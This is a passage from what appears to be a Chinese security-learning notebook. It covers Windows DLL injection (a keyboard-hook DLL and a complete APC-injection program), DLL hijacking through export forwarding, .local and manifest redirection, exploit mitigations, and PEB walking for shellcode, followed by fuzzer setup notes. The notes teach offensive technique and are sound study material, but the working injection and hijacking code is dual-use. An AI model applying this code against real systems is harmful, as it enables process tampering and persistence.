_In_ LPARAM lParam ); 实现过程 简单起见，直接使用《逆向工程核心原理》的敲击记录的代码来做实验。 keylogger.dll，用来准备注入 dll 程序。 #include #include HINSTANCE g_hInstance = NULL; HHOOK g_hHook = NULL; HWND g_hWnd = NULL; #define DEF_PROCESS_NAME \"notepad.exe\" // 这个回调函数用来处理键盘输入 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { char szPath[MAX_PATH] = {0}; char* p = NULL; if(nCode >= 0) { if(!(lParam & 0x80000000)) { GetModuleFileNameA(NULL, szPath, MAX_PATH); // 取\\\\之后的字符，用来判断是不是目标进程notepad。 p = strrchr(szPath, '\\\\'); } } if( !_stricmp(p + 1, DEF_PROCESS_NAME) ) return 1; // 不是就换下一个函数 return CallNextHookEx(g_hHook, nCode, wParam, lParam); } // 利用api启动挂钩 __declspec(dllexport) void StartHook() { g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); } // 取消挂钩 __declspec(dllexport) void StopHook() { // 先检查一下第一步挂钩是否成功，是被就不用了 if(g_hHook) { UnhookWindowsHookEx(g_hHook); g_hHook = NULL; } } // 这里的dllmain实际上用不到, 写不写都无所谓了 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: g_hInstance = hinstDLL; break; case DLL_PROCESS_DETACH: break; } return TRUE; } 向开始的话直接调用这个dll就可以，然后设置一个退出的条件。 4、APC注入 APC，全称为Asynchronous Procedure Call，异步过程调用，是指函数在特定线程中被异步执行，在操作系统中，APC是一种并发机制。 异步执行 同步 发出一个功能调用时，在没有得到结果之前，该调用就不返回或继续执行后续操作。 简单来说，同步就是必须一件一件事做，等前一件做完了才能做下一件事。 例如：B/S模式中的表单提交，具体过程是：客户端提交请求->等待服务器处理->处理完毕返回，在这个过程中客户端（浏览器）不能做其他事。 类似于顺序执行。 异步 当一个异步过程调用发出后，调用者在没有得到结果之前，就可以继续执行后续操作。当这个调用完成后，一般通过状态、通知和回调来通知调用者。对于异步调用，调用的返回并不受调用者控制。 就是当前线程等待之后，回去执行其他的代码。 状态 即监听被调用者的状态（轮询），调用者需要每隔一定时间检查一次，效率会很低。 通知 当被调用者执行完成后，发出通知告知调用者，无需消耗太多性能。 回调 与通知类似，当被调用者执行完成后，会调用调用者提供的回调函数。 阻塞和非阻塞 阻塞与非阻塞主要是程序（线程）等待消息通知时的状态角度来说的。阻塞和非阻塞关注的是程序在等待调用结果（消息，返回值）时的状态。 阻塞调用结果返回之前，线程会被挂起，得到结果才会返回，就像scanf等待输入一样。 非阻塞调用在不能立刻得到结果之前，该调用不会阻塞当前线程。 异步和阻塞的关系 同步/异步关注的是消息通知的机制 --------------------------> 机制 而阻塞/非阻塞关注的是线程等待消息通知时的状态。 --------------------------> 状态 核心函数 作用：利用这个函数向休眠的目标线程中的APC队列中插入一个函数，在线程恢复的时候，就可以执行到这个函数。 将用户模式 异步过程调用 (APC) 对象添加到指定线程的 APC 队列。 每个线程都有自己的 APC 队列。 应用程序通过调用 QueueUserAPC 函数将 APC 排队到线程。 调用线程在对 QueueUserAPC 的调用中指定 APC 函数的地址。 APC 的排队是线程调用 APC 函数的请求。 DWORD QueueUserAPC( [in] PAPCFUNC pfnAPC, // 指向指定线程执行等待操作时要调用的 APC 函数的指针 [in] HANDLE hThread, // 线程的句柄。 句柄必须具有 THREAD_SET_CONTEXT 访问权限 [in] ULONG_PTR dwData // 传递给 pfnAPC 参数指向的 APC 函数的单个值。 ); 返回一个整数值。失败返回0； 将上述解释放到实际运用中的作用。 DWORD QueueUserAPC( // 要执行函数的地址 [in] PAPCFUNC pfnAPC, // 指向指定线程执行等待操作时要调用的 APC 函数的指针 // 插入APC的线程句柄 [in] HANDLE hThread, // 线程的句柄。 句柄必须具有 THREAD_SET_CONTEXT 访问权限 // 传递给执行函数的参数 [in] ULONG_PTR dwData // 传递给 pfnAPC 参数指向的 APC 函数的单个值。 ); 所以这里可以将该方法当作进程注入的方法，或者是dll注入的方法。 dll注入方法：第一个参数 传loadlibrary的地址，第二个传递dll的路径。 实现代码 注入前提：得给一个注入的机会 必须是多线程环境下 注入的程序必须会调用那些同步对象 基本思路： 当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。 当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。 利用QueueUserAPC()在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。 代码流程： 将注入dll的路径写到目标程序中，获得写入的地址。 获得loadlibrary的地址。 利用QueueUserAPC()将loadlibrary注入的目标进程中。 目标线程恢复执行，调用APC里的这个loadlibrary，在目标进程中挂载dll。 因为是要通过APC向线程中插入函数，所以需要获得进程中的线程，给每一个线程都插入一下，失败了就继续下一个，比直接定位要方便一些。 获取所有线程： BOOL GetProcessThreadList(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength) { // 申请空间 DWORD dwThreadIdListLength = 0; DWORD dwThreadIdListMaxCount = 2000; LPDWORD pThreadIdList = NULL; HANDLE hThreadSnap = INVALID_HANDLE_VALUE; pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pThreadIdList == NULL) { return FALSE; } RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD)); THREADENTRY32 th32 = { 0 }; // 拍摄快照 hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, th32ProcessID); if (hThreadSnap == INVALID_HANDLE_VALUE) { return FALSE; } // 结构的大小 th32.dwSize = sizeof(THREADENTRY32); //遍历所有THREADENTRY32结构, 按顺序填入数组 BOOL bRet = Thread32First(hThreadSnap, &th32); while (bRet) { if (th32.th32OwnerProcessID == th32ProcessID) { if (dwThreadIdListLength >= dwThreadIdListMaxCount) { break; } pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID; } bRet = Thread32Next(hThreadSnap, &th32); } *pThreadIdListLength = dwThreadIdListLength; *ppThreadIdList = pThreadIdList; return TRUE; } 注入过程 #include #include #include #include #include /* * 注意loadlibrary的参数模式和参数的形式，char还是unicode * 主要dll的绝对路径，不能用中文，同目录也要用绝对路径 */ #define notePID 23472 LPCWSTR dllpath = L\"C:\\\\Users\\\\rootkit\\\\Desktop\\\\messageboxDll.dll\"; //列出指定进程的所有线程, BOOL GetProcessThreadList(DWORD** ppThreadIdList, LPDWORD pThreadIdListLength) { // 申请空间 DWORD dwThreadIdListLength = 0; DWORD dwThreadIdListMaxCount = 2000; LPDWORD pThreadIdList = NULL; HANDLE hThreadSnap = INVALID_HANDLE_VALUE; pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pThreadIdList == NULL) { return FALSE; } RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD)); THREADENTRY32 th32 = { 0 }; // 拍摄快照, 通过第一个参数快照系统中的所有线程，指定进程的快照 hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, notePID); if (hThreadSnap == INVALID_HANDLE_VALUE) { return FALSE; } // 结构的大小 th32.dwSize = sizeof(THREADENTRY32); //遍历所有THREADENTRY32结构, 按顺序填入数组【有关系统快照中遇到的任何进程的第一个线程的信息。】 //函数返回的快照的句柄 , 指向 THREADENTRY32 结构的指针 BOOL bRet = Thread32First(hThreadSnap, &th32); while (bRet) { // 先检查当前线程是不是指定进程下的线程 if (th32.th32OwnerProcessID == notePID) { if (dwThreadIdListLength >= dwThreadIdListMaxCount) { break; } pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID; } // 遇到的任何进程的下一个线程的信息 bRet = Thread32Next(hThreadSnap, &th32); } *pThreadIdListLength = dwThreadIdListLength; *ppThreadIdList = pThreadIdList; return TRUE; } int main() { size_t dwsize = (_tcslen(dllpath) + 1) * sizeof(TCHAR); //size_t dwsize = (strlen(dllpath) + 1); //* sizeof(TCHAR); // 获取目标进程的句柄，采用打开现有进程的形式 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notePID); // 在目标进程中开辟内存空间，用来存放注入的dll的地址 LPVOID pRemotebuf = VirtualAllocEx(hProcess, NULL, dwsize, MEM_COMMIT, PAGE_READWRITE); printf(\"[+] VirtualAlloc sucess addr = %p\\n\", pRemotebuf); // 向开辟出来的地址写入dll路径 WriteProcessMemory(hProcess, pRemotebuf, dllpath, dwsize, NULL); printf(\"[+] WriteProcessMemory sucess write dll path to target memroy \\n\"); /* * 获取loadlibrary的地址。两种方法 * 1、直接在本程序获得（在Windows中共享库的地址是一定的） * 2、利用PEB计算目标程序的kerneldll地址，复杂但是适合远程 */ HMODULE hMOD = GetModuleHandle(L\"kernelbase.dll\"); //HMODULE hMOD = GetModuleHandle(L\"kernelbase.dll\"); LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMOD, \"LoadLibraryW\"); printf(\"[+] GetProcAddress sucess pthreadproc = %p\\n\", pThreadProc); /* 执行dll */ // 先获得目标进程中的所有线程 LPDWORD pThreadIdList = NULL; DWORD dwThread_ListLength = 0; GetProcessThreadList(&pThreadIdList, &dwThread_ListLength); // 遍历线程，得机会注入APC DWORD fail = 0; for (int i = dwThread_ListLength - 1; i >= 0; i--) { // 打开线程 HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]); if (hThread) { // 插入APC, 因为有条件，所以这里不一定都会成功，所以要进行错误准备 if (!QueueUserAPC((PAPCFUNC)pThreadProc, hThread, (ULONG_PTR)pRemotebuf)) { fail++; } // 关闭线程句柄 CloseHandle(hThread); hThread = NULL; } } printf(\"Total Thread: %d\\n\", dwThread_ListLength); printf(\"Total Failed: %d\\n\", fail); if (fail >= dwThread_ListLength) { printf(\"Apc injection is failed\\n\"); } // 关闭句柄 CloseHandle(hProcess); return 0; } 结果：可以看到该dll已经成功加载到对应进程的内存中了，但是因为我写的dll里有太多的弹窗，可能会卡死，所以能不能弹出来看运气 5、其他 上述是常见的一些dll注入的方式，但是还有很多方式可以用来实现这个目的，只需要api可以满足调用loadlibrary和带一个参数就可以实现，比如RtlCreateUserThread 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-11 19:42:37 "},"MyArticles/CyberSec/dll劫持原理学习和应用.html":{"url":"MyArticles/CyberSec/dll劫持原理学习和应用.html","title":"dll劫持原理以及方式实践","keywords":"","body":"dll劫持技术是一种名字听起来很高级但是实际上原理很简单的一种技巧。 简介 在Windows系统中运行可执行文件时，系统会调用相应需要的.dll文件，系统的默认优先级规则是最优先调用是当前目录下的.dll链接库，寻找不到则去系统目录下寻找。或者程序会动态生成目录然后使用loadlibrary去动态调用。 如果程序没有使用SetDllDirectory()函数设定dll加载绝对路径，则程序很大可能性即存在dll劫持注入漏洞。 原理 根据dll加载的顺序来替换dll文件，并且将原dll文件的功能进行转发。 dll搜索顺序 dll的搜索顺序微软这几年一直在改，包括使用一些安全手段来改变搜索顺序。一般的顺序如下 应用程序加载的目录 系统目录，使用 GetSystemDirectory 获取该路径 16 位系统目录 Windows 目录，使用 GetWindowsDirectory 获取该路径 当前目录 PATH 环境变量中列出的目录 一、劫持思路： 同名dll替换策略，但是这里会出现无效的情况，原因就是： 当内存中已加载相同模块名称的 dll 时，系统将直接加载该 dll，不会进行搜索；除非设置了 dll 重定向选项 如果要加载的 dll 模块属于 Known DLLs，系统直接加载系统目录下的该 dll，不会进行搜索。 Known DLLs 列表：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs 暗度陈仓 - 函数转发 要是想持久的运行恶意代码，就需要保证程序的正常运行，所以恶意的dll必须可以提供正常dll的功能，考虑到技术成本，对原功能进行重写不太现实，所以我们通过函数转发来实现。实现流程如下图所示： 一、函数较少 这种就可以直接仿照原dll的导出函数格式和参数通过LoadLibrary函数去调用原dll的导出函数。 二、函数过多 导出函数太多的话上述方式过于麻烦，通过定义def文件，把工作交给链接器去执行，微软给出的说明， .def文件是文本文件，其中包含一个或多个描述 DLL 的各种特性的模块语句。 如果没有使用 *__declspec(dllexport) 关键字来导出 DLL 的函数，则 DLL 需要 DEF 文件。 这里通过一个python代码来获得导出表 import os import time import pefile import sys # 实现了自动将dll中的导出函数自动整理到def文件中同时将原dll文件改名（old+） dll_name = \"msvcrt.dll\" os.rename(dll_name, \"old\"+dll_name) dll = pefile.PE(\"old\"+dll_name) count = 0 with open(dll_name.replace(\".dll\", \".def\"), \"a\", encoding='utf-8')as file: file.write('LIBRARY '+dll_name+'\\n'+'EXPORTS\\n') for export in dll.DIRECTORY_ENTRY_EXPORT.symbols: if export.name == None: print(\"no export name, ordinal is \"+str(export.ordinal)) line = str(export.ordinal) else: line = \"{}={}.{}\\t@{}\".format(export.name.decode(), dll_name, export.name.decode(), export.ordinal) count += 1 print(count, line) file.write(\"\\t\"+line+\"\\n\") print(\"finish\") # gcc -shared fake_peparser.c fake_peparser.def -o fake_peparser.dll -m32 1、def文件 def文件的基本格式如下 LIBRARY BTREE EXPORTS Insert @1 Delete @2 Member @3 Min @4 2、示例 以Pe Studio为例，他调用了一个peparser.dll的动态库，这个库中导出了两个函数，我们来劫持一下 首先构造一个假的dll，并且利用def方式连接上面的真的dll的导出函数 a. 构造fakedll fake_peparser.c #include #include BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD hPrevInstance, LPVOID lpReserved) { switch (hPrevInstance) { case DLL_PROCESS_ATTACH: MessageBox(NULL,TEXT(\"hello world\"),TEXT(\"Hello\"),NULL); break; case DLL_PROCESS_DETACH: MessageBox(NULL,TEXT(\"hello world\"),TEXT(\"DETACH\"),NULL); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; } return TRUE; } fake_peparser.def LIBRARY fake_peparser.dll EXPORTS create=oldpeparser.create @1 run=oldpeparser.run @2 通过命令：gcc -shared fake_peparser.c fake_peparser.def -o fake_peparser.dll -m32进行编译 最后得到fake_peparser.dll文件。通过ida观察他的导出表。看到成功导出了两个函数，但是在本dll中是无法访问的。 b. 实测 先改一下名，直接欺骗劫持 欺骗基本成功，但是影响到了程序的正常执行，调试发现他在fakedll中只写进去了字符串而不是程序 通过调试程序发现他并不是不会载入之前的dll 他也会调用到原先的dll，但是不知道为啥程序不能正常运行了。 他确实会调用之前的dll中的导出函数 在附加调试器的状态下他可以成功的打开原程序并运行，经过测试发现问题在def文件中。 成功测试： 3、解决问题 这是原先的会报错的def文件： LIBRARY fake_peparser.dll EXPORTS create=oldpeparser.create @1 run=oldpeparser.run @2 这是修改之后的可以成功运行的def文件： LIBRARY peparser.dll EXPORTS create=oldpeparser.create @1 run=oldpeparser.run @2 第一行发生了变化. LIBRARY [library][BASE=address] // 指定 DLL 的名称 这个名称和要劫持的名称对上就好了。 最后实验完记得改回来。 如果导出函数没有导出名称，只有导出序号，Gcc 和 Tcc 不支持按序号导出的函数转发，可以使用 VisualStdio 分类 dll劫持一般分为两类： 专属dll劫持 系统dll劫持 一、专属dll劫持 这个就是针对某一个程序进行的劫持行为，根据程序调用dll的方式去进行替换，和上面的测试案例差不多的思路 二、系统dll劫持 对一些Windows官方的dll进行劫持，这里需要重启之后才能生效。因为他们在开机的时候就已经载入内存中了，所以需要重启一下。这种劫持方式会导致所有的程序都会加载，适合进行沙箱或者是蜜罐的监控策略。 非常底层的ntdll之类的dll不能劫持，因为他本身实现了函数装载和转发的功能。 三、dll重定向 有些dll已经被系统或者是其他的程序加载到内存中了，这时候如果需要劫持某个特定程序的这个dll就需要用到重定向的方式，强制让他去执行你指定的dll。 但是一般的Windows系统都会关闭这个功能，在注册表中 HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options 添加 DevOverrideEnable (DWORD) 字段并设置为 1，来开启该功能，重启后生效。但是我没有重启。 .local 首先需要在程序同目录下创建ProgramName.exe.local目录，然后将fakedll和原本的dll（方便转发）放进去。 这里使用普通程序中会载入的msvcrt.dll来进行测试。这里就需要用到目录了。需要将假的dll和真的dll都放在这个目录中，这就可以达到目的。 manifest 还可以使用 manifest 配置文件(xml文件)，优先级高于 .local。这个出现再flareon 的以此竞赛中，这个东西配置了一些pe文件的基础东西。所以我们可以从这个配置文件下手，这个东西可能是独立的文件，也可能是直接附加到pe文件的后面了。这里不需要新建目录，将所有的东西放到一个一个目录就可以。 这里需要构建的是两个manifest文件，分别是目标EXE文件和fakedll的。 msvcrt.dll.manifest DLL Redirection test.exe.manifest 最后在执行dll劫持的目录中应该是这样的 ├── test.c ├── oldmsvcrt.dll ├── msvcrt.dll ├── msvcrt.dll.manifest ├── test.exe └── test.exe.manifest 这样就达成目的了。 供应链dll劫持 dll劫持的方式可以施加到编译器的上面，通过修改编译器会使用的dll，来达到在通过这个编译器编译的程序中插入后门的目的，常见的一般有 TCC劫持 Gcc劫持 去劫持vs的编译器对安全检查比较困难，所以针对这些编译器下手比较方便。 参考 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-05-04 20:12:39 "},"MyArticles/Vulnerability_Mining.html":{"url":"MyArticles/Vulnerability_Mining.html","title":"Vulnerability Mining","keywords":"","body":"经过我的实践发现，漏洞挖掘是网络安全中更重要的。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-06 19:54:54 "},"MyArticles/Vulnerability_Mining/Windows通用shellcode编写.html":{"url":"MyArticles/Vulnerability_Mining/Windows通用shellcode编写.html","title":"shellcode编写-地址定位","keywords":"","body":"问题 Windows下的shellcode中往往会用到大量的API函数，这些API来自各种的调用库，这时就涉及到了地址定位的问题。 一、程序保护 简单对比对比，至于每种保护怎么绕过，那之后再说，好久不打pwn了。 Windows GS 和canary一样，通过在栈上设置关键值来保护溢出。 异常处理SEH链也在栈上因此可以覆盖SEH链为jmp esp的地址，之后触发异常跳转到esp执行shellcode。 SafeSEH SafeSEH是在程序编译的时候，就将所有的异常处理函数进行注册。凡是执行过程中触发异常后，都要经过一个检验函数，检查SEH链指向的地址是否在注册的列表中。 可以有效防止GS中的修改SEH的方式。 DEP 堆和栈只有读写权限没有执行权限。linux上是利用ret2libc的方式绕过，Windows上通过执行VirtualProtect()将shellcode所在内存属性添加上可执行权限来绕过这个方式。 ASLR 地址空间布局随机化（ASLR）应运而上，ALSR即是让exe、dll的地址全都随机。有效防止了DEP的攻击方式，压根定位不到ROP。 堆喷射 对抗ASLR的方式是暴力把程序空间占满，全铺上shellcode，只要跳转地址没落在已有模块中，落在我们的空间中即可以执行了shellcode，但是这样做无法绕过DEP，这种将程序空间全部占满铺上shellcode的技术被称为堆喷射技术，堆喷射技术只能对抗ASLR，缺无法对抗ASLR+DEP的双重防护。 CFG 微软在Win 8.1 Update 3以及Win 10中启用了一种抵御内存泄露攻击的新机制，即Control Flow Guard(CFG)——控制流防护。 通过在间接跳转前插入校验代码，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点， 最终及时并有效的进行异常处理，避免引发相关的安全问题。 简单的说，就是在程序间接跳转之前，会判断这个将要跳转的地址是否是合法的。 linux 利用peda插件的checksec可以查看程序开启的保护。 CANNARY 金丝雀保护，linux上最经典的栈溢出保护策略，类似于Windows下的GS保护。 canary设计是以“x00”结尾，本意就是为了保证canary可以截断字符串，但是这也成为了识别canary的关键标志。 泄露栈中canary的思路是覆盖canary的低字节，来打印出剩余的canary部分。 常用格式化字符串或者是 fork函数的单字节爆破两种方式进行泄露 FORTIFY 这个保护基本没法绕，这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。 加了这个保护（编译时加上参数-D_FORTIFY_SOURCE=2）一些敏感函数如read, fgets, memcpy, printf等等会被替换成read_chk, fgets_chk, memcpy_chk,printf_chk等带_chk后缀的函数。 NX 经典的堆栈不可执行保护，No-execute保护。将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。和windows下的DEP原理相同。 说是堆栈不可执行，实际上是整个 数据页面上都不行，这时jmp-shellcode的方式就不行了，就到了最传统的return-to-libc的攻击方式。 PIE 内存空间随机化保护，position-independent executable。在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。通过扰乱获取固定的地址定位来保护程序。-no-pie参数来开启关闭。 影响的是绝对地址，但是相对偏移不变。 RELRO read only relocation。设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。这种防范方式是对延迟绑定攻击的一种防护。 二、API地址定位 api在dll库里，api相对于dll基地址的偏移是不变的. Base address 过程 1、通过FS寄存器定位到线程环境块TEB结构体。（64-bit用的是GS寄存器）。 2、在TEB结构体中找到PEB结构体（32，64位不同） 3、通过PEB结构体找到指向 PEB_LDR_DATA 结构体的指针，存放着已经被进程装载的动态链接库的信息。 InLoadOrderModuleList; //模块加载顺序 InMemoryOrderModuleList; //模块在内存中的顺序 InInitializationOrderModuleList; //模块初始化装载顺序 4、在上述结构体中找到模块初始化链表的头指针 InInitializationOrderModuleList 5、看到链表的结构也比较简单 6、模块初始化链表 InInitializationOrderModuleList 中按顺序存放着 PE 装入运行时初始化模块的信息。 ​ 第一个链表结点是 ntdll.dll，第二个是kernelbase.dll，第三个链表结点就是 kernel32.dll。 7、找到属于 kernel32.dll 的结点后，在其基础上再偏移 0x08 就是 kernel32.dll 在内存中的加载基地址。 这是因为，kernel32这占据8字节。 8、从 kernel32.dll 的加载基址算起，偏移 0x3C 的地方就是其 PE 头，这个是通过静态分析得到的，pe文件结构 9、PE 头偏移 0x78 的地方存放着指向函数导出表的指针。 流程图 实现代码 获取到LDR之后，这个双链表指向进程装载的模块，结构中的每个指针，指向了一个LDR_DATA_TABLE_ENTRY 的结构（The head of a doubly-linked list that contains the loaded modules for the process. Each item in the list is a pointer to an LDR_DATA_TABLE_ENTRY structure ）InMemoryOrderModuleList含进程的已加载模块的多维链接列表的头 可以看到这样的一个双向链表。这样就可以获得 LDR_DATA_TABLE_ENTRY 结构体的基本结构了 typedef struct _LDR_DATA_TABLE_ENTRY { PVOID Reserved1[2]; LIST_ENTRY InMemoryOrderLinks; PVOID Reserved2[2]; PVOID DllBase; PVOID Reserved3[2]; UNICODE_STRING FullDllName; BYTE Reserved4[8]; PVOID Reserved5[3]; #pragma warning(push) #pragma warning(disable: 4201) // we'll always use the Microsoft compiler union { ULONG CheckSum; PVOID Reserved6; } DUMMYUNIONNAME; #pragma warning(pop) ULONG TimeDateStamp; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY; 可以利用上面的结构体查找dll的基地址。关键还是节点的遍历。 #include #include #include #include #include typedef LONG(NTAPI* NtQueryInformationProcessPtr)( HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength ); int main() { PWSTR ModuleName[10]; DWORD64 ModuleAddr[10]; DWORD ProcID = 29616; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcID); HMODULE hNtdll = LoadLibraryA(\"ntdll.dll\"); if (hNtdll == NULL) { printf(\"无法加载 ntdll.dll 库\\n\"); return 1; } NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, \"NtQueryInformationProcess\"); //find base addr by peb PROCESS_BASIC_INFORMATION pbi; ULONG ReturnLength; NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &ReturnLength); if (status != 0) { printf(\"NtQueryInformationProcess 失败，错误码 %lu\\n\", status); return 1; } PEB peb; ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL); PPEB_LDR_DATA ldrr = peb.Ldr; PLIST_ENTRY pListEntry = ldrr->InMemoryOrderModuleList.Flink; int i = 0; int j = 0; while (pListEntry != &ldrr->InMemoryOrderModuleList) { PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); ModuleAddr[i] = (DWORD64)pEntry->DllBase; ModuleName[i] = pEntry->FullDllName.Buffer; pListEntry = pListEntry->Flink; i++; } for (j = 0; j \", ModuleName[j]); printf(\"%I64p\\n\", ModuleAddr[j]); } printf(\"finish\\n\"); CloseHandle(hProcess); return 0; } 上述代码实现了利用InMemoryOrderModuleList链表。访问导入模块基地址的功能，同时也可以访问模块的名称字符串。 一般的程序显示的导入模块顺序是： [++] Loaded DLL: {C:\\Users\\Rootkit\\Desktop\\dll [++] Loaded DLL: {C:\\WINDOWS\\SYSTEM32\\ntdll.dll} base address: [++] Loaded DLL: {C:\\WINDOWS\\System32\\KERNEL32.DLL} base address: [++] Loaded DLL: {C:\\WINDOWS\\System32\\KERNELBASE.dll} base address: [++] Loaded DLL: {C:\\WINDOWS\\SYSTEM32\\VCRUNTIME140D.dll} base address: [++] Loaded DLL: {C:\\WINDOWS\\SYSTEM32\\ucrtbased.dll} base address: 先是自己的路径，遇到中文会截断，然后是一些系统dll。 缺点 只能访问到当前载入的dll，不因为dll基本是动态载入的，所以访问到的比较少，同时对于loadlibrary访问的dll也是无法获取到的。 Offset address 思路 1、 拿到基地址实际上就是MZ所在的地址，这时候根据PE文件结构直接定位就可以了。这里需要定位的是程序的导出表 利用结构体和ReadProcessMemory函数将内容读进结构体，就可以定位到函数的导出表 2、 直接记住偏移，基址不同，但是偏移是一定的。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-06 20:51:16 "},"MyArticles/Vulnerability_Mining/cve-2017-11882分析.html":{"url":"MyArticles/Vulnerability_Mining/cve-2017-11882分析.html","title":"office：CVE-2017-11882 分析","keywords":"","body":"没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-27 22:08:37 "},"MyArticles/ToolUsage.html":{"url":"MyArticles/ToolUsage.html","title":"Tool usage","keywords":"","body":"工欲善其事，必先利其器。居是邦也，事其大夫之贤者，友其士之仁者。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:38:47 "},"MyArticles/ToolUsage/HonggFuzz使用-入门.html":{"url":"MyArticles/ToolUsage/HonggFuzz使用-入门.html","title":"honggfuzz使用-安装","keywords":"","body":"这个fuzz工具简单，但是可能会有一些奇怪的问题。 下载 不要直接clone他github里的项目，那个有bug，而且是语法错误压根就没法编译 而是下载他release版本里的source code进行编译。我用的是这个版本 下载之后直接linux下编译，官方文档说支持Windows，但是我Windows实在是没成功，有成功的大佬能分享一下经验嘛 ,我的邮箱 然后根据他官方文档的教程直接编译就行了 过程 进入honggfuzz目录 ，然后直接make，遇到什么报错就装什么库，需要提前进行一些准备 apt update apt upgrade apt install gcc apt install clang 在make之前先进行一个关键的操作，进Makefile，把一个傻逼的参数改了😅 这个会把警告变成报错 第一个错误 通过 apt install libunwind8-dev 可以解决上述问题 第二个问题 这就是缺少bfd库，完事 apt install libbfd-dev 最后 make clean，make，sudo make install 在install的时候可以最后一步也会出问题，但是我发现不影响使用。 有这个文件就差不多了，可以执行它看看参数，就差不多可以用了。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-27 21:32:34 "},"MyArticles/ToolUsage/WinAFL使用-入门.html":{"url":"MyArticles/ToolUsage/WinAFL使用-入门.html","title":"WinAFL使用-安装","keywords":"","body":"WinAFL 因为winafl需要的测试时间比较长，所以目前采取的策略： 本地的win10虚拟机环境配置，命令配置，样本收集，成功跑起环境的时候推送到服务器上进行长时间测试（操作相同配置、或者直接推送到服务器上） 环境 win10专业版，但是认证过期了 安装WinAFL 安装DynamoRIO（新+旧，注意选对仓库，右边的那个仓库） cmake 3.190，高版本问题也不大，别太低就行 Visual Studio 2019（c++环境） 过程 需要提前安装好Visual Studio 2019（c++环境）和perl环境还有doxygen。最好提前安装好，配置好环境变量（或者在make里面当时添加）。 编译DynamoRIO 这个是插桩库，关于fuzz中在Windows上用来插桩的关键工具，如果没有这个东西，winAFL就不能编译出winafl.dll这个关键文件。两种方式，我建议直接安装编译好的版本，关键就是里面的cmake目录。 编译AFL 不同的位数需要分开编译，用到cmake-gui，为什么呢，因为Windows下的命令行不会讲错误高亮出来，你也不知道对错，给自己埋地雷。 64 利用cmake的gui填入相关目录 这里第二个输出目录随便，没有她会自己新建。然后Configure一下，这里需要注意的是在File里有一个清理缓存的选项 Configure里面第一个就是要选择一下编译环境 第二行可以选择是32还是64位，默认是64，一般就这样就直接finish，然后下面可能会报错，缺少message compiler或者是什么其他的就everything找一下，然后把目录添加进去就行，参考这里就行。 完成之后，还需要再点击Generate，完事就去目标目录里，用vs打开sln文件 这个用vs打开，然后用vs编译就行，这里网上的教程基本都是让你用命令行，这种做法相对比较傻逼一些，给自己找麻烦。 直接生成解决方案就行，这里注意会有一个报错，但是好像不影响文件的生成。 注意项目里有没有winafl这个文件，没有的话就说明cmake失败了。 32 注意在cmake里的Configure的时候选择一下，其他步骤一致。vs编译的时候不会报错 最后 看到这样基本就成了。也可以看到目录下生成的文件。 红框中的是关键文件，其他文件都是一些测试用例和我自己写的案例。 使用例子 为了验证程序是不是能跑，先找一个命令测试一下 下面的命令需要在cmd中使用，Windows 